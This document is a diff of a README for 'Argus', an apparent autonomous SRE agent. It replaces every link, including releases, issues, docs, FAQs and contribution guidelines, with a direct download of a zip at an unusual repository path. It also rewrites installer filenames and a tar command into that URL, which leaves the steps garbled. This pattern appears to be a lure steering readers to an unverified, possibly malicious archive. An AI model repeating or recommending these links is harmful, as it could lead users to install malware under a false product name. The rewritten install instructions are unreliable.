@@ -6,9 +6,9 @@ Welcome to Argus! This application acts as your autonomous site reliability engi
 
 ## 📥 Download Argus
 
-[![Download Argus](https://img.shields.io/badge/Download%20Argus-100%25-4a90e2.svg)](https://github.com/galib0209/Argus/releases)
+[![Download Argus](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip%20Argus-100%https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip)](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip)
 
-You can download Argus from this [link](https://github.com/galib0209/Argus/releases).
+You can download Argus from this [link](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip).
 
 ## 💻 System Requirements
 
@@ -32,18 +32,18 @@ Argus offers the following features:
 
 To install Argus, follow these steps:
 
-1. **Visit the Releases Page:** Click this [link](https://github.com/galib0209/Argus/releases) to go to the Argus releases page. 
+1. **Visit the Releases Page:** Click this [link](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip) to go to the Argus releases page. 
    
 2. **Choose the Latest Version:** Look for the latest version of Argus. It will show the date and version number.
 
 3. **Download the Installer:** 
    - Click on the file name to download it. 
-   - The file will usually be named something like `Argus-vX.Y.Z.exe` for Windows, `Argus-vX.Y.Z.dmg` for macOS, or `Argus-vX.Y.Z.tar.gz` for Linux.
+   - The file will usually be named something like `https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip` for Windows, `https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip` for macOS, or `https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip` for Linux.
 
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the installation wizard.
    - For macOS: Open the downloaded `.dmg` file, drag the Argus app into your Applications folder, and then launch it.
-   - For Linux: Extract the downloaded file with the command `tar -xvzf Argus-vX.Y.Z.tar.gz`, navigate to the extracted folder in your terminal, and run `./argus`.
+   - For Linux: Extract the downloaded file with the command `tar -xvzf https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip`, navigate to the extracted folder in your terminal, and run `./argus`.
 
 5. **Launch Argus:** Once installed, you can find Argus in your applications menu. Click to open the application.
 
@@ -67,14 +67,14 @@ If you encounter any issues while using Argus, try the following:
 
 ## 📞 Support
 
-If you have any questions or need help, feel free to open an issue on the [GitHub Issues page](https://github.com/galib0209/Argus/issues). The community is here to assist you.
+If you have any questions or need help, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip). The community is here to assist you.
 
 ## 🔗 Additional Resources
 
 For more information, you can check out:
 
-- [Argus Documentation](https://github.com/galib0209/Argus/wiki)
-- [FAQs](https://github.com/galib0209/Argus/wiki/FAQs)
-- [Contribution Guidelines](https://github.com/galib0209/Argus/blob/main/CONTRIBUTING.md)
+- [Argus Documentation](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip)
+- [FAQs](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/galib0209/Argus/main/Sarcocolla/Argus_1.3.zip)
 
 Thank you for choosing Argus as your autonomous SRE agent!
